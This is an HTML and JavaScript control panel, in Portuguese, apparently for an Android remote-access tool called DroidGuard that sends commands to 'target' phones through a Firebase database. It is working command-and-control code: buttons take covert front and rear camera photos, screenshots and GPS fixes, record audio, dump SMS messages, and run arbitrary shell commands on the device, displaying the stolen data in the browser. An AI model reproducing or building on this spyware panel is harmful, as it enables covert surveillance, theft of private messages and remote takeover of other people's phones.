<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DroidGuard - Central de Comando</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; }
        .logo h1 { background: linear-gradient(135deg, #2f8e8b, #4fd1c5); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .device-selector { background: #1a1f2a; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
        select, button { background: #2f8e8b; border: none; padding: 10px 20px; border-radius: 8px; color: white; margin: 5px; cursor: pointer; }
        select { background: #1e2a36; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .card { background: #0f1219; border-radius: 20px; padding: 20px; border: 1px solid #1e2a36; }
        .card h3 { margin-bottom: 15px; border-left: 4px solid #2f8e8b; padding-left: 12px; }
        button { transition: 0.2s; }
        button:hover { transform: scale(1.02); background: #3fa39f; }
        .cmd-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
        .result-img { max-width: 100%; border-radius: 12px; margin-top: 10px; background: #000; }
        .result-audio audio { width: 100%; margin-top: 10px; }
        .sms-list { max-height: 300px; overflow-y: auto; }
        .sms-item { background: #1a1f2a; padding: 10px; margin: 8px 0; border-radius: 8px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #1a1f2a; padding: 30px; border-radius: 20px; max-width: 500px; width: 90%; }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: none; background: #0d1418; color: white; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .online { color: #2ecc71; }
        .offline { color: #e74c3c; }
    </style>
</head>
<body>
<div class="header">
    <div class="logo"><h1><i class="fas fa-shield-alt"></i> DroidGuard</h1><p>Central de Comando Remoto</p></div>
    <div><i class="fas fa-database"></i> Firebase Real-time</div>
</div>

<div class="device-selector">
    <i class="fas fa-mobile-alt"></i> Dispositivo Alvo:
    <select id="deviceSelect" onchange="mudarDispositivo()">
        <option value="">Selecione um dispositivo...</option>
    </select>
    <button onclick="refreshDevices()"><i class="fas fa-sync-alt"></i> Atualizar</button>
    <span id="deviceStatus" style="margin-left: 15px;"></span>
</div>

<div class="grid">
    <!-- Câmeras -->
    <div class="card">
        <h3><i class="fas fa-camera"></i> Câmeras</h3>
        <div class="cmd-group">
            <button onclick="enviarComando('foto_frontal')"><i class="fas fa-camera"></i> Foto Frontal</button>
            <button onclick="enviarComando('foto_traseria')"><i class="fas fa-camera-retro"></i> Foto Traseira</button>
        </div>
        <div id="fotoResultado"></div>
    </div>

    <!-- Tela -->
    <div class="card">
        <h3><i class="fas fa-desktop"></i> Captura de Tela</h3>
        <button onclick="enviarComando('screenshot')"><i class="fas fa-image"></i> Capturar</button>
        <div id="screenResultado"></div>
    </div>

    <!-- Localização -->
    <div class="card">
        <h3><i class="fas fa-map-marker-alt"></i> Localização GPS</h3>
        <button onclick="enviarComando('gps')"><i class="fas fa-location-dot"></i> Pegar Localização</button>
        <div id="gpsResultado"></div>
    </div>

    <!-- Áudio -->
    <div class="card">
        <h3><i class="fas fa-microphone"></i> Gravação</h3>
        <div class="cmd-group">
            <button onclick="enviarComando('gravar_audio', {duracao: 5})">5 segundos</button>
            <button onclick="enviarComando('gravar_audio', {duracao: 10})">10 segundos</button>
            <button onclick="enviarComando('gravar_audio', {duracao: 30})">30 segundos</button>
        </div>
        <div id="audioResultado"></div>
    </div>

    <!-- SMS -->
    <div class="card">
        <h3><i class="fas fa-envelope"></i> Mensagens SMS</h3>
        <button onclick="enviarComando('listar_sms')"><i class="fas fa-list"></i> Listar SMS</button>
        <div id="smsResultado" class="sms-list"></div>
    </div>

    <!-- Ações -->
    <div class="card">
        <h3><i class="fas fa-mobile"></i> Ações Rápidas</h3>
        <button onclick="enviarComando('vibrar', {duracao: 1000})"><i class="fas fa-bell"></i> Vibrar</button>
        <button onclick="abrirModalFalar()"><i class="fas fa-volume-up"></i> Falar</button>
        <button onclick="enviarComando('bateria')"><i class="fas fa-battery-full"></i> Ver Bateria</button>
    </div>

    <!-- Shell Remoto -->
    <div class="card">
        <h3><i class="fas fa-terminal"></i> Shell Remoto</h3>
        <input type="text" id="shellCmd" placeholder="Comando Linux/Android...">
        <button onclick="executarShell()"><i class="fas fa-play"></i> Executar</button>
        <pre id="shellResultado" style="background:#000; padding:10px; border-radius:8px; margin-top:10px; max-height:200px; overflow:auto;"></pre>
    </div>
</div>

<!-- Modal Falar -->
<div id="modalFalar" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-volume-up"></i> Falar no Dispositivo</h3>
        <input type="text" id="textoFalar" placeholder="Digite o texto para falar...">
        <div class="cmd-group">
            <button onclick="enviarComando('falar', {texto: document.getElementById('textoFalar').value}); fecharModalFalar()">Enviar</button>
            <button onclick="fecharModalFalar()">Cancelar</button>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
<script>
    const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    
    let deviceAtual = null;
    
    // Monitorar dispositivos online
    function refreshDevices() {
        db.ref('dispositivos').once('value', (snapshot) => {
            const devices = snapshot.val() || {};
            const select = document.getElementById('deviceSelect');
            select.innerHTML = '<option value="">Selecione um dispositivo...</option>';
            
            for (let id in devices) {
                const device = devices[id];
                const status = device.status === 'online' ? '🟢' : '🔴';
                const option = document.createElement('option');
                option.value = id;
                option.textContent = `${status} ${id} - Bateria: ${device.bateria ? JSON.parse(device.bateria).percentage : '?'}%`;
                select.appendChild(option);
            }
        });
    }
    
    function mudarDispositivo() {
        deviceAtual = document.getElementById('deviceSelect').value;
        if(deviceAtual) {
            // Monitorar status do dispositivo
            db.ref(`dispositivos/${deviceAtual}`).on('value', (snap) => {
                const d = snap.val();
                if(d) {
                    const statusSpan = document.getElementById('deviceStatus');
                    statusSpan.innerHTML = d.status === 'online' ? '<span class="online">🟢 Online</span>' : '<span class="offline">🔴 Offline</span>';
                    if(d.bateria) {
                        const bat = JSON.parse(d.bateria);
                        statusSpan.innerHTML += ` | 🔋 ${bat.percentage}%`;
                    }
                }
            });
        }
    }
    
    async function enviarComando(acao, params = {}) {
        if(!deviceAtual) {
            alert('Selecione um dispositivo primeiro!');
            return;
        }
        
        const comandoId = Date.now().toString();
        const comando = { acao, params, timestamp: Date.now() };
        
        // Enviar comando
        await db.ref(`comandos/${deviceAtual}/${comandoId}`).set(comando);
        
        // Aguardar resultado
        const resultadoRef = db.ref(`resultados/${deviceAtual}/${comandoId}`);
        
        resultadoRef.once('value', (snap) => {
            const resultado = snap.val();
            if(resultado) {
                exibirResultado(acao, resultado);
            }
        });
        
        // Timeout
        setTimeout(() => {
            resultadoRef.off();
        }, 30000);
    }
    
    function exibirResultado(acao, resultado) {
        console.log('Resultado:', acao, resultado);
        
        if(acao === 'foto_frontal' || acao === 'foto_traseria') {
            const div = document.getElementById('fotoResultado');
            div.innerHTML = `<img src="data:image/jpeg;base64,${resultado.foto}" class="result-img">`;
        }
        else if(acao === 'screenshot') {
            const div = document.getElementById('screenResultado');
            div.innerHTML = `<img src="data:image/png;base64,${resultado.screen}" class="result-img">`;
        }
        else if(acao === 'gps') {
            const div = document.getElementById('gpsResultado');
            div.innerHTML = `<iframe width="100%" height="250" frameborder="0" style="border-radius:12px" 
                src="https://maps.google.com/maps?q=${resultado.latitude},${resultado.longitude}&z=15&output=embed"></iframe>
                <p>📍 ${resultado.latitude}, ${resultado.longitude}</p>`;
        }
        else if(acao === 'gravar_audio' && resultado.audio) {
            const div = document.getElementById('audioResultado');
            div.innerHTML = `<audio controls src="data:audio/aac;base64,${resultado.audio}"></audio>`;
        }
        else if(acao === 'listar_sms' && resultado.sms) {
            const div = document.getElementById('smsResultado');
            div.innerHTML = resultado.sms.map(s => 
                `<div class="sms-item"><strong>📱 ${s.numero}</strong><br>${s.texto}<br><small>${s.data}</small></div>`
            ).join('');
        }
        else if(acao === 'bateria') {
            alert(`Bateria: ${resultado.nivel}% - Status: ${resultado.status}`);
        }
        else if(acao === 'falar') {
            alert('✅ Comando de voz enviado!');
        }
        else if(acao === 'vibrar') {
            alert('📳 Vibração enviada!');
        }
    }
    
    async function executarShell() {
        const cmd = document.getElementById('shellCmd').value;
        if(!cmd) return;
        await enviarComando('shell', {cmd: cmd});
        
        // Aguardar resultado específico
        if(deviceAtual) {
            const comandoId = Date.now().toString();
            await db.ref(`comandos/${deviceAtual}/${comandoId}`).set({acao: 'shell', params: {cmd: cmd}, timestamp: Date.now()});
            
            db.ref(`resultados/${deviceAtual}/${comandoId}`).once('value', (snap) => {
                const r = snap.val();
                if(r) {
                    document.getElementById('shellResultado').textContent = r.stdout || r.stderr || 'Sem saída';
                }
            });
        }
    }
    
    function abrirModalFalar() {
        document.getElementById('modalFalar').style.display = 'flex';
    }
    
    function fecharModalFalar() {
        document.getElementById('modalFalar').style.display = 'none';
    }
    
    // Atualizar a cada 5 segundos
    refreshDevices();
    setInterval(refreshDevices, 5000);
</script>
</body>
</html>
